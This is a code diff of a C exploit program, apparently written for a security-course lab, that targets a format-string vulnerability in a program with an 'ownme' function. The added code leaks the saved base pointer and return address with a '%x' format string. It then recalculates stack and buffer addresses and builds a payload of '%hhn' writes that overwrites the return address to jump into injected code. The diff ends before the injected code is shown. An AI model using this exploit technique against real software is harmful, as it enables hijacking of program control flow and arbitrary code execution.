@@ -105,6 +105,11 @@ void create_subproc(const char* exec, char* argv[]) {
    }
 }
 
+/* Helper function to convert a two byte hex value to decimal */
+int convert_hex(unsigned hex) {
+   return (hex & 0xf) + (hex & 0xf0);
+}
+
 /* Shows an example session with subprocess. Change it as you see fit, */
 
 #define STRINGIFY2(X) #X
@@ -126,41 +131,68 @@ int main(int argc, char* argv[]) {
    getchar();
 
    // Values needed for attack
-   void *mainloop_bp = (void*) 0xbfffef58;   // mainloop ebp
-   void *mainloop_ra = (void*) 0x0804b652;   // mainloop esp
-   void *ownme_addr  = (void*) 0x0804b1dd;   // addr of ownme
-   void *main_ra_loc = (void*) 0xbfffef2c;   // mainloop ra location
+   void *mainloop_bp = (void*) 0xbfffefe8;   // main_loop ebp
+   void *mainloop_ra = (void*) 0x804b652;    // main_loop saved eip (RA)
+   void *ownme_addr  = (void*) 0x804b1dd;    // addr of ownme
+   void *main_ra_loc = (void*) 0xbfffefec;   // main_loop ra location
+   void *rdbuf_loc   = (void*) 0xbfffe860;   // address of rdbuf
 
    // Relative distances
-   unsigned mainloop_bp_ra_diff = mainloop_bp - main_ra_loc;
-   unsigned mainloop_ownme_diff = ownme_addr  - mainloop_ra;
+   unsigned mainloop_bp_ra_diff = main_ra_loc - mainloop_bp;
+   unsigned mainloop_ownme_diff = mainloop_ra - ownme_addr;
+   unsigned mainloop_bp_rdbuff_diff = mainloop_bp - rdbuf_loc;
 
    // 634 the saved bp; 635 the return address.
    put_str("e %634$x %635$x\n");
    send();
 
-   // Just for reference
-   fprintf(stderr, "Original RA: %x, BP: %x\n\n", (unsigned)mainloop_ra,  (unsigned)mainloop_bp);
-
    // Get current mainloop bp and ra
    unsigned cur_mainloop_bp, cur_mainloop_ra;
    get_formatted("%x%x", &cur_mainloop_bp, &cur_mainloop_ra);
 
-   fprintf(stderr, "mainloop ra: %x, mainloop bp: %x\n\n", cur_mainloop_ra, cur_mainloop_bp);
+   fprintf(stderr, "mainloop ra: %x, mainloop bp: %x\n", cur_mainloop_ra, cur_mainloop_bp);
 
    // Calculate main_loop ra location
-   unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
-
-   fprintf(stderr, "New Main ra location: %x\n\n", cur_mainloop_ra_loc);
+   unsigned cur_mainloop_ra_loc = cur_mainloop_bp + mainloop_bp_ra_diff;
+   fprintf(stderr, "current ra location: %x\n", cur_mainloop_ra_loc);
 
    // Actual ownme address
-   unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
+   unsigned cur_ownme_addr = cur_mainloop_ra - mainloop_ownme_diff;
+   fprintf(stderr, "current ownme addr: %x\n", cur_ownme_addr);
 
-   fprintf(stderr, "New ownme addr: %x\n\n", cur_ownme_addr);
+   // Current rdbuff address
+   unsigned cur_rdbuf_addr = cur_mainloop_bp - mainloop_bp_rdbuff_diff;
+   fprintf(stderr, "current rdbuff addr: %x\n", cur_rdbuf_addr);
 
-   char exploit[] =
-      "\x08\x04\xb1\xdd"
+   // Address of injected code in exploit buffer
+   unsigned code_addr = cur_rdbuf_addr + 256;
+
+   // Initialize exploit buffer
+   // 128 bytes for each "section" (attack_format, params, injected code)
+   char exploit[128 * 3];
+   memset(exploit, '\0', sizeof(exploit));
+
+   // Populate "attack_format" part of exploit buffer
+   // NOTE: Offset, in words, from printf's stack frame to the first byte in 
+   // rdbuf is 152 (determined using GDB + trial and error). This means that
+   // the offset to the "params" part of the exploit string is 152 + 128 = 280
+   char attack_format[] =
+      "%%256d%%%dd%%280$hhn" // write first byte to addr at offset 280
+      "%%256d%%%dd%%281$hhn" // write second byte to addr at offset 281
+      "%%256d%%%dd%%282$hhn" // ...
+      "%%256d%%%dd%%283$hhn" // write last byte to addr at 283
    ;
+
+   sprintf(exploit, attack_format, convert_hex(code_addr), 
+           convert_hex(code_addr >> 8), convert_hex(code_addr >> 16),
+           convert_hex(code_addr >> 24));
+
+   // Populate "params" part of exploit string
+   // 128 from base of exploit = 280 from printf's stack frame
+   *(unsigned*)(exploit + 128) = cur_mainloop_ra_loc;
+   *(unsigned*)(exploit + 132) = cur_mainloop_ra_loc + 1;
+   *(unsigned*)(exploit + 136) = cur_mainloop_ra_loc + 2;
+   *(unsigned*)(exploit + 140) = cur_mainloop_ra_loc + 3;
 
    put_str("e ");
    put_bin(exploit, 4);
